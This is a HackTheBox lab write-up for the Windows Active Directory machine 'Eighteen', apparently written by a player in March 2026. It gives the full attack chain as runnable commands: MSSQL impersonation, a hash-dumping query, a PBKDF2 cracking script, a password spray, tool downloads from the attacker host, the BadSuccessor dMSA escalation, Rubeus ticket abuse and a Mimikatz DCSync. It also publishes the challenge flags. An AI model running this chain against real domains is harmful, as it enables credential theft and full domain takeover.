# HackTheBox — Eighteen
**Difficulty:** Easy | **OS:** Windows | **Category:** Active Directory  
**User flag:** `**0e455098a159388eae992687fb29**`  
**Root flag:** `**3f7f5ffc0eb6f91fb9d81cc915e3**`

---

## Attack Chain Summary

```
Given creds (kevin) → MSSQL login → SQL impersonation (appdev)
→ financial_planner DB dump → PBKDF2 hash crack (iloveyou1)
→ RID brute → WinRM password spray → shell as adam.scott (user flag)
→ BadSuccessor (dMSA abuse on OU=Staff) → Rubeus TGT+TGS as web_svc$
→ Mimikatz DCSync → Administrator NTLM → root flag
```

---

## Enumeration

### Nmap

```bash
nmap -sC -sV -p- -Pn --min-rate 5000 10.129.11.142 -oN eighteen_full.txt
```

**Open ports:**

| Port | Service | Detail |
|------|---------|--------|
| 80 | HTTP | Microsoft IIS 10.0 — redirects to `http://eighteen.htb/` |
| 1433 | MSSQL | Microsoft SQL Server 2022 RTM — DC01.eighteen.htb |
| 5985 | WinRM | Microsoft HTTPAPI 2.0 |

Key NTLM metadata from nmap:
- `NetBIOS_Computer_Name: DC01`
- `DNS_Domain_Name: eighteen.htb`
- `Product_Version: 10.0.26100` → **Windows Server 2025 Build 26100**

### Hosts

```bash
echo "10.129.11.142 eighteen.htb DC01.eighteen.htb" | sudo tee -a /etc/hosts
```

---

## Foothold — MSSQL Exploitation

### Connect with provided credentials

```bash
impacket-mssqlclient kevin:'iNa2we6haRj2gaw!'@10.129.11.142
```

### Enumerate impersonation

```sql
SQL> enum_impersonate
-- Returns: IMPERSONATE LOGIN on: appdev (granted to kevin)
```

### Impersonate appdev and dump credentials

```sql
SQL> EXECUTE AS LOGIN = 'appdev';
SQL> USE financial_planner;
SQL> SELECT username, email, password_hash FROM dbo.users;
```

**Output:**

| username | email | password_hash |
|----------|-------|---------------|
| admin | admin@eighteen.htb | `pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90...` |

### Crack the hash

The hash format is Werkzeug PBKDF2-HMAC-SHA256. Hashcat doesn't support it natively — custom Python cracker required:

```python
#!/usr/bin/env python3
import hashlib
from multiprocessing import Pool, cpu_count

SALT = "AMtzteQIG7yAbZIa"
ITERATIONS = 600000
TARGET_HASH = "0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133"
WORDLIST = "/usr/share/wordlists/rockyou.txt"

def check_password(password):
    try:
        computed = hashlib.pbkdf2_hmac('sha256', password, SALT.encode(), ITERATIONS)
        if computed.hex() == TARGET_HASH:
            return password.decode(errors="ignore")
    except:
        pass
    return None

def main():
    print("[+] Starting PBKDF2-SHA256 cracker...")
    with open(WORDLIST, "rb") as f:
        passwords = (line.strip() for line in f)
        with Pool(cpu_count()) as pool:
            for result in pool.imap_unordered(check_password, passwords, chunksize=500):
                if result:
                    print(f"[+] CRACKED: {result}")
                    pool.terminate()
                    return

if __name__ == "__main__":
    main()
```

```bash
python3 hash_cracker.py
# [+] CRACKED: iloveyou1
```

---

## User Flag

### RID brute-force to enumerate domain users

```bash
nxc mssql 10.129.11.142 -u kevin -p 'iNa2we6haRj2gaw!' --rid-brute --local-auth
```

Identified users: `jamie.dunn`, `jane.smith`, `alice.jones`, `adam.scott`, `bob.brown`, `carol.white`, `dave.green`

Also confirmed: **Windows Server 2025 Build 26100**, domain controller DC01.

### Password spray against WinRM

```bash
nxc winrm 10.129.11.142 -u users.txt -p 'iloveyou1' --no-bruteforce
# [+] eighteen.htb\adam.scott:iloveyou1 (Pwn3d!)
```

### Shell and user flag

```bash
evil-winrm -i 10.129.11.142 -u adam.scott -p 'iloveyou1'
```

```powershell
type C:\Users\adam.scott\Desktop\user.txt
# **0e455098a159388eae992687fb29**
```

---

## Privilege Escalation — BadSuccessor (CVE-2025 / dMSA Abuse)

### Why this works

`Product_Version: 10.0.26100` = Windows Server 2025. This build is vulnerable to **BadSuccessor** — a privilege escalation technique that abuses delegated Managed Service Accounts (dMSA). An account with `CreateChild` rights on an OU can create a dMSA linked to a privileged target (e.g. Administrator), then request a Kerberos ticket that carries the target's PAC.

### Enumerate writable OUs

```powershell
# Upload PowerView
iwr http://10.10.14.58:8080/PowerView.ps1 -OutFile PowerView.ps1
Import-Module .\PowerView.ps1

# Find CreateChild rights
Get-DomainOU | Get-DomainObjectAcl | Where-Object { $_.ActiveDirectoryRights -match "CreateChild" -and $_.ObjectDN -like "*Staff*" } | ForEach-Object { $sid = $_.SecurityIdentifier; $name = (Convert-SidToName $sid); "$sid -> $name" }
```

**Output:**
```
S-1-5-21-1152179935-589108180-1989892463-1604 -> EIGHTEEN\IT
```

adam.scott is a member of **EIGHTEEN\IT** → has `CreateChild` on `OU=Staff,DC=eighteen,DC=htb`.

### Create malicious dMSA (BadSuccessor)

```powershell
iwr http://10.10.14.58:8080/BadSuccessor.ps1 -OutFile BadSuccessor.ps1
. .\BadSuccessor.ps1
BadSuccessor -mode exploit -Path "OU=Staff,DC=eighteen,DC=htb" -Name "web_svc" -DelegatedAdmin "adam.scott" -DelegateTarget "Administrator" -domain "eighteen.htb"
# Successfully created and configured dMSA 'web_svc'
# Object adam.scott can now impersonate Administrator
```

### Get TGT as adam.scott (Rubeus — runs on victim, no clock sync needed)

```powershell
iwr http://10.10.14.58:8080/Rubeus.exe -OutFile Rubeus.exe
.\Rubeus.exe asktgt /user:adam.scott /password:iloveyou1 /domain:eighteen.htb /enctype:aes256 /nowrap
```

### Request TGS for LDAP service (impersonating web_svc$ → Administrator PAC)

```powershell
.\Rubeus.exe asktgs /ticket:<TGT_BASE64> /service:ldap/DC01.eighteen.htb /dmsa /targetdmsa:web_svc$ /enctype:aes256 /nowrap
```

### Inject LDAP ticket

```powershell
.\Rubeus.exe ptt /ticket:<LDAP_TGS_BASE64>
# [+] Ticket successfully imported!
```

### DCSync via Mimikatz

```powershell
iwr http://10.10.14.58:8080/mimikatz.exe -OutFile mimikatz.exe
.\mimikatz.exe "lsadump::dcsync /domain:eighteen.htb /user:Administrator" exit
```

**Output:**
```
Hash NTLM: 0b133be956bfaddf9cea56701affddec
```

---

## Root Flag

```bash
evil-winrm -i 10.129.11.142 -u Administrator -H 0b133be956bfaddf9cea56701affddec
```

```powershell
type C:\Users\Administrator\Desktop\root.txt
# **3f7f5ffc0eb6f91fb9d81cc915e3**
```

---

## Key Takeaways

| Stage | Technique | Why it worked |
|-------|-----------|---------------|
| Foothold | MSSQL login impersonation | kevin had IMPERSONATE rights on appdev |
| Cred extraction | PBKDF2 hash cracking | Weak password in app DB |
| Lateral movement | WinRM password spray | Password reuse across domain accounts |
| Privesc | BadSuccessor dMSA abuse | EIGHTEEN\IT had CreateChild on OU=Staff |
| Domain compromise | Kerberos ticket → DCSync | dMSA PAC carries Administrator's privileges |

---

## Tools Used

- `impacket-mssqlclient` — MSSQL authentication and impersonation
- `nxc` (NetExec) — RID brute force, WinRM spray
- `evil-winrm` — WinRM shell
- `PowerView.ps1` — AD enumeration
- `BadSuccessor.ps1` (LuemmelSec) — dMSA creation exploit
- `Rubeus.exe` — Kerberos TGT/TGS requests on-box
- `mimikatz.exe` — DCSync

---

*Written by thrandomv | HackTheBox — Eighteen | March 2026*
